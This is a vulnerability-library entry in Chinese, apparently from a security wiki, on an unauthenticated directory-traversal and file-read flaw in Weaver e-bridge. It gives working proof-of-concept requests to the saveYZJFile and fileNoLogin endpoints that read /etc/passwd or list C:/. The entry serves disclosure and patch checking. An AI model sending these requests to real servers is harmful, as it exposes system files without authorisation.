---
source: "白阁文库 BaizeSec/bylibrary"
title: "泛微e-bridge saveYZJFile目录/文件读取"
product: "泛微e-bridge"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "2018–2019；file://及文件访问权限"
prerequisites: "无凭证示例，声称拒绝即修复不充分"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_status: "unknown"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E6%B3%9B%E5%BE%AEoa/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5e-bridge%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
id: "vw-3c0474b1d1abb4d8d6ed124c"
entity_id: "ve-3c0474b1d1abb4d8d6ed124c"
schema_version: "1"
---

# 泛微e-bridge saveYZJFile目录/文件读取

## 条目说明

- 对象与具体问题：泛微e-bridge；saveYZJFile目录/文件读取
- 版本、配置及部署条件：2018–2019；file://及文件访问权限
- 认证与权限前提：无凭证示例，声称拒绝即修复不充分
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 与saveYZJFile长短篇同机制，目录列表条件是可保留补充
- 身份验证失败不能直接证明补丁已修复，可能网关/配置差异

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

---
title: '泛微云桥e-bridge 目录遍历/文件读取漏洞'
date: Mon, 21 Sep 2020 01:12:13 +0000
draft: false
tags: ['白阁-漏洞库']
---

##### 漏洞信息:

泛微云桥是一个为了满足用户提出的阿里钉钉与泛微OA集成需泛微0A云桥e-bridge 其 /wxjsapi/saveYZJFile 接口可以读取文件内容并保存，而后可通过/file/fileNoLogin/{id}，读取文件内容。

##### 影响范围:

主要影响 2018-2019 版本

##### 漏洞复现:

如果使用POC回显**`"无法验证您的身份！"`**证明改漏洞已被修复
 **POC中，当downloadUrl的路径为文件夹的时候结果为目录遍历  linux windows 通用**
 Windows POC：

```html
/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/&fileExt=txt #查看页面中的id值
```


```
/file/fileNoLogin/<id> #访问文件接口，根据上一步获取的id对文件内容进行读取
```


如果提示`msg "/C: (No such file or directory)" `就表示为Linux系统（表示不存在C盘）
 Linux POC：

```html
/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt
/file/fileNoLogin/<id> #访问文件接口，根据上一步获取的id对文件内容进行读取
```

#### 04 实例

Linux系统主目录（根目录）

 Linux中/ect/passwd文件


##### 修复方案:

尽快升级到最新版本


---

> 来源：白阁文库 BaizeSec/bylibrary
